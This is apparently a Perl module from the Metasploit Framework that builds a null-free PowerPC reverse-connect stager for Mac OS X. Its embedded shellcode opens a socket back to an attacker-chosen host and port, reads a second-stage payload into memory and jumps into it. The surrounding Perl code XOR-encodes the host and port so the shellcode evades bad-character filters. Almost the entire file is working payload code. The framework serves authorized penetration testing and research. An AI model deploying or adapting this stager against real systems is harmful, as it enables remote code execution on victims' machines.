###############
##
#
#    Name: ReverseNFStager.pm
# Version: $Revision$
#  Source: src/shellcode/osx/ppc/stager_sock_reverse_nf.asm
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      PowerPC reverse stager for OSX (null-free).
#
##
###############

package Msf::PayloadComponent::OSX::ppc::ReverseNFStager;

use strict;
use base 'Msf::PayloadComponent::OSX::ReverseStager';


my $info =
{
    'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
    'Arch'         => [ 'ppc' ],
    'Priv'         => 0,
    'OS'           => [ 'osx' ],
    'Multistage'   => 1,      
    'Size'         => '',
};

sub Payload {
	my $self = shift;
	my $host = $self->GetVar('LHOST');
	my $port = $self->GetVar('LPORT');
	my $badc = $self->BadChars || "\x00";
	
	my $scode = pack('N*', 
		 0x3b603091,     # 0x1d70 <socket>:        li      r27,12433
		 0x381bcfd0,     # 0x1d74 <socket+4>:      addi    r0,r27,-12336
		 0x387bcf71,     # 0x1d78 <socket+8>:      addi    r3,r27,-12431
		 0x389bcf70,     # 0x1d7c <socket+12>:     addi    r4,r27,-12432
		 0x38bbcf75,     # 0x1d80 <socket+16>:     addi    r5,r27,-12427
		 0x44ffff02,     # 0x1d84 <socket+20>:     sc
		 0x7ca52a78,     # 0x1d88 <socket+24>:     xor     r5,r5,r5
		 0x7c7e1b78,     # 0x1d8c <socket+28>:     mr      r30,r3
		 0x3b206353,     # 0x1d90 <storeaddr>:     li      r25,25427
		 0x6b394142,     # 0x1d94 <storeaddr+4>:   xori    r25,r25,16706
		 0x3bbbcf71,     # 0x1d98 <storeaddr+8>:   addi    r29,r27,-12431
		 0x57bd801e,     # 0x1d9c <storeaddr+12>:  rlwinm  r29,r29,16,0,15
		 0x7fbdcb78,     # 0x1da0 <storeaddr+16>:  or      r29,r29,r25
		 0x93a1ffec,     # 0x1da4 <storeaddr+20>:  stw     r29,-20(r1)
		 0x3fa07e02,     # 0x1da8 <storeaddr+24>:  lis     r29,32258
		 0x63bd0305,     # 0x1dac <storeaddr+28>:  ori     r29,r29,773
		 0x3f800102,     # 0x1db0 <storeaddr+32>:  lis     r28,258
		 0x639c0304,     # 0x1db4 <storeaddr+36>:  ori     r28,r28,772
		 0x7fbde278,     # 0x1db8 <storeaddr+40>:  xor     r29,r29,r28
		 0x93a1fff0,     # 0x1dbc <storeaddr+44>:  stw     r29,-16(r1)
		 0x3881ffec,     # 0x1dc0 <konnect>:       addi    r4,r1,-20
		 0x38bbcf7f,     # 0x1dc4 <konnect+4>:     addi    r5,r27,-12417
		 0x381bcfd1,     # 0x1dc8 <konnect+8>:     addi    r0,r27,-12335
		 0x7fc3f378,     # 0x1dcc <konnect+12>:    mr      r3,r30
		 0x44ffff02,     # 0x1dd0 <konnect+16>:    sc
		 0x7ca52a78,     # 0x1dd4 <konnect+20>:    xor     r5,r5,r5
		 0x3ba03330,     # 0x1dd8 <reader>:        li      r29,13104
		 0x7fbd6670,     # 0x1ddc <reader+4>:      srawi   r29,r29,12
		 0x381bcf72,     # 0x1de0 <reader+8>:      addi    r0,r27,-12430
		 0x7fc3f378,     # 0x1de4 <reader+12>:     mr      r3,r30
		 0x3881dfd4,     # 0x1de8 <reader+16>:     addi    r4,r1,-8236
		 0x38a0202c,     # 0x1dec <reader+20>:     li      r5,8236
		 0x7c8903a6,     # 0x1df0 <reader+24>:     mtctr   r4
		 0x44ffff02,     # 0x1df4 <reader+28>:     sc
		 0x7ca52a78,     # 0x1df8 <reader+32>:     xor     r5,r5,r5
		 0x7ca52a79,     # 0x1dfc <reader+36>:     xor.    r5,r5,r5
		 0x4c810420,     # 0x1e00 <reader+40>:     blectr
		 0x7ca52a78,     # 0x1e04 <reader+44>:     xor     r5,r5,r5					 
	);
	
	# 34 = port ^ port_key, 38 = port_key
	# 58 = hi(ip ^ host_key), 62 = lo(ip ^ host_key)
	# 66 = hi(host_key), 70 = lo(host_key)
	
	# XXX - suboptimal - move to keyscan for word
	my $port_key;
	for my $test_key (0x0100 .. 0xffff) {
		if (! Pex::Text::BadCharCheck($badc, pack('nn', $port ^ $test_key, $test_key))) {
			$port_key = $test_key;
			last;
		}
	}

	if (! $port_key) {
		$self->PrintDebugLine(3, "OSXReverseStagerNF: no port_key found that will evade badChars");
		$port_key = 0;
	}

	my $host_bin = gethostbyname($host);
	my $host_key = Pex::Encoding::XorDword->KeyScan($host_bin, $badc);

	if (! $host_key) {
		$self->PrintDebugLine(3, "OSXReverseStagerNF: no host_key found that will evade badChars");
		$host_key = 0;	
	}

	my $host_key_bin = pack('N', $host_key);

	# Patch up the shellcode...
	substr($scode, 34, 2, pack('n', $port ^ $port_key));
	substr($scode, 38, 2, pack('n', $port_key));
	substr($scode, 58, 2, substr($host_bin, 0, 2) ^ substr($host_key_bin, 0, 2));
	substr($scode, 62, 2, substr($host_bin, 2, 2) ^ substr($host_key_bin, 2, 2));
	substr($scode, 66, 2, substr($host_key_bin, 0, 2));
	substr($scode, 70, 2, substr($host_key_bin, 2, 2));

	return { 'Payload' => $scode };
}

sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, { Info => $info });
	$self = $class->SUPER::new($hash, @_);

	return $self;
}

1;
